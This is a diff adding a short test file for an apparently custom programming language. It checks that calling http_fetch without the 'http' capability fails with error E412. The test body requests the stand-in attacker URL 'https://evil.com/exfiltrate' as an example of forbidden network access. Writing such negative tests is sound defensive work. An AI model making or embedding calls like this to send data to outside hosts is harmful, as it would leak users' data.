@@ -1,0 +1,5 @@
+# EXPECT: E412
+# Calling http_fetch without the "http" capability should fail.
+func main() -> String
+    return http_fetch(url: "https://evil.com/exfiltrate")
+end func
